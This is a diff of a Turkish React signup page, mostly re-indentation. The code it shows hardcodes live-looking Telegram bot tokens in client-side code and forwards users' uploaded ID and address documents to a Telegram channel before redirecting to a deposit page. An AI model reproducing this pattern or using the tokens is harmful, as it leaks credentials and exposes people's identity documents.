@@ -46,7 +46,7 @@ const SignupPage = () => {
     }
   };
 
-  const handleAddressImageChange = (e) => { 
+  const handleAddressImageChange = (e) => {
     if (e.target.files) {
       setAddressImage(e.target.files[0]);
       setPhotoContent2(e.target.files[0]);
@@ -54,75 +54,75 @@ const SignupPage = () => {
 
   };
   const botToken = '6901253574:AAHbWBJJYHyJWudIM_B460DWK9YHXa3EzJg';
-const channelName = '@galyaislemler';
+  const channelName = '@galyaislemler';
 
 
 
   async function registerUser() {
     await createUserWithEmailAndPassword(auth, email, password)
-    .then(async (userCredential) => {
-      const botToken = '6844283169:AAGEWaXEt3r7AZcHQPFwP82Nk-qgUfs1oBA';
-      const channelName = '@galyakayit';
-      const formData2 = new FormData();
-      const formData = new FormData();
-      formData.append('photo', photoContent);
-      formData2.append('photo', photoContent2);
-  
-   
-      const text = `🎊🎊 Yeni Kayıt 🎊🎊%0A  ➡️➡️${firstName}%0A  Kayıt işlemini tamamladı %0A Evraklarını bir alt mesajda gönderiyorum %0A Kontrol Eder misiniz ?. `;
-      try {
-        const sendResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${channelName}&text=${text} `);
-  
-        const uploadResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${channelName}`, {
-          method: 'POST',
-          body: formData
-        });
-        const uploadResponse2 = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${channelName}`, {
-          method: 'POST',
-          body: formData2
-        });
-        const sendResponse2 = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${channelName}&text=----====----====----====----====----====----`);
-        const sendResponse3 = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${channelName}&text=----====----====----====----====----====----`);
-  
-  
+      .then(async (userCredential) => {
+        const botToken = '6844283169:AAGEWaXEt3r7AZcHQPFwP82Nk-qgUfs1oBA';
+        const channelName = '@galyakayit';
+        const formData2 = new FormData();
+        const formData = new FormData();
+        formData.append('photo', photoContent);
+        formData2.append('photo', photoContent2);
+
+
+        const text = `🎊🎊 Yeni Kayıt 🎊🎊%0A  ➡️➡️${firstName}%0A  Kayıt işlemini tamamladı %0A Evraklarını bir alt mesajda gönderiyorum %0A Kontrol Eder misiniz ?. `;
+        try {
+          const sendResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${channelName}&text=${text} `);
+
+          const uploadResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${channelName}`, {
+            method: 'POST',
+            body: formData
+          });
+          const uploadResponse2 = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${channelName}`, {
+            method: 'POST',
+            body: formData2
+          });
+          const sendResponse2 = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${channelName}&text=----====----====----====----====----====----`);
+          const sendResponse3 = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${channelName}&text=----====----====----====----====----====----`);
+
+
           const uploadResult = await uploadResponse2.json();
           if (uploadResult.ok) {
-              setAddressImage("")
-              setEmail("")
-              setFirstName("")
-              setIdImage("")
-              setPassword("")
-              setPhone("")
-              setPhotoContent(null)
-              setPhotoContent2(null)
-              router.push('/deposit/page')
-              alert('Kayıt Başarılı , lütfen giriş yapınız');
-              console.log('Photo uploaded successfully:', uploadResult);
-              return uploadResult.result.photo[0].file_id;
+            setAddressImage("")
+            setEmail("")
+            setFirstName("")
+            setIdImage("")
+            setPassword("")
+            setPhone("")
+            setPhotoContent(null)
+            setPhotoContent2(null)
+            router.push('/deposit/page')
+            alert('Kayıt Başarılı , lütfen giriş yapınız');
+            console.log('Photo uploaded successfully:', uploadResult);
+            return uploadResult.result.photo[0].file_id;
           } else {
-              return null;
+            return null;
           }
-      } catch (error) {
+        } catch (error) {
           console.error('Photo upload error:', error);
           return null;
-      }
-        
-      
+        }
+
+
         // ...
-    })
-    .catch((error) => {
+      })
+      .catch((error) => {
         const errorCode = error.code;
         const errorMessage = error.message;
         alert(errorCode);
         // ..
-    });
-    
-}
+      });
+
+  }
 
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-     await registerUser();
+    await registerUser();
 
     // Gönderim tamamlandıktan sonra formları sıfırlayabilirsiniz
     setFirstName('');
@@ -135,7 +135,7 @@ const channelName = '@galyaislemler';
 
   return (
     <>
-      <section className="relative z-10 overflow-hidden    lg:pb-28 lg:pt-[60px]">
+      <section className="relative z-10 overflow-hidden  xs:pt-[120px]  lg:pb-28 lg:pt-[120px]">
         <div className="container">
           <div className=" flex flex-wrap">
             <div className="w-full px-4">
@@ -146,9 +146,9 @@ const channelName = '@galyaislemler';
                 <p className="mb-11 text-center text-base font-medium text-body-color">
                   Bütün Alanlar Zorunludur
                 </p>
-         
 
-          
+
+
                 <div className="mb-3 flex items-center justify-center">
                   <span className="hidden h-[1px] w-full max-w-[60px] bg-body-color/50 sm:block"></span>
                   <p className="w-full px-5 text-center text-base font-medium text-body-color">
@@ -181,10 +181,10 @@ const channelName = '@galyaislemler';
                       className="mb-3 block text-sm text-dark dark:text-white"
                     >
                       {" "}
-                       Telefon{" "}
+                      Telefon{" "}
                     </label>
                     <input
-                     required
+                      required
                       type="text"
                       value={phone}
                       onChange={handlePhoneChange}
@@ -200,10 +200,10 @@ const channelName = '@galyaislemler';
                       className="mb-3 block text-sm text-dark dark:text-white"
                     >
                       {" "}
-                       Email{" "}
+                      Email{" "}
                     </label>
                     <input
-                     required
+                      required
                       type="email"
                       value={email}
                       onChange={handleEmailChange}
@@ -224,7 +224,7 @@ const channelName = '@galyaislemler';
                       Şifreniz{" "}
                     </label>
                     <input
-                     required
+                      required
                       type="password"
                       value={password}
                       onChange={handlePasswordChange}
